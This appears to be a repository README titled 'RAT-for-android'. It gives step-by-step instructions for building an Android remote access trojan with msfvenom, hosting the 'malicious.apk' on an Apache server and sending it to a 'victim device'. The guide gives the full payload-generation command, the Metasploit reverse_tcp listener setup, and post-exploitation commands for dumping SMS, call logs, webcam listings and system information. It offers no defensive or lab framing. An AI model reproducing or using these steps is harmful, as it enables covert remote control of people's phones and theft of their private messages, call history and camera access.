# RAT-for-android
A Guide for making you own RAT(Remote access tool) for android with the help of msfconsole.

# Requirment to create your own RAT.
1.Kali linux
2.metaspolit framework
3.Apache2

# Steps to create RAT(Remote access tool)

1. Ensure that your system is upto date.
   (sudo apt update && sudo apt upgrade -y)

2. Install apache2 in your system.
   (sudo apt install apache2 -y)

3. After installing you need to enable and start apache2 server.
   (sudo systemctl start apache2),
   (sudo systemctl enable apache2)

4. Verify that apache2 is running or not.
 (sudo systemctl status apache2)

5. If you have firewall enable in you system you need to add rule in firewall for apache2.
   (sudo ufw allow 'Apache Full')

6. You wil get you apache2 server folder at (/var/www/html/)

7. Now you have successfully created your apache2 server you can vist you index page of you server at
   (http//{your-ip}/index.html)

8. Next step is to create payload for you RAT apk.

9. We are using msfvenom for creating payload.
    (msfvenom -p android/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<port> R > malicious.apk).
   
10. LHOST: Your IP address (use ifconfig to find it).  
     LPORT: A port number for listening (e.g., 4444).  
     malicious.apk: The name of the APK file created.

11. After creating apk you can upload it to you server show that anyone with you link can download or you can share apk any way to victim device.

    (mv malicious.apk /var/www/html/) for moving apk to server.

12. Now open msfconsole to monitro the apk and perform task on it on victim device.

# Steps to connect to the paylod in victim device

sudo msfconsole  

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST {your-ip}

set LPORT {port}

exploit

13. Hit enter to exploit make sure you have successfully install the payload to the victim device.

14. It will get connect to victim device now you can have access to it file manager,sms,calllogs,sysinfo,camer,etc.

15. once connection is successfull try using (dump_sms for sms ,dump_calllog for call logs ,webcam_list , sysinfo for system info, ls to list dir)
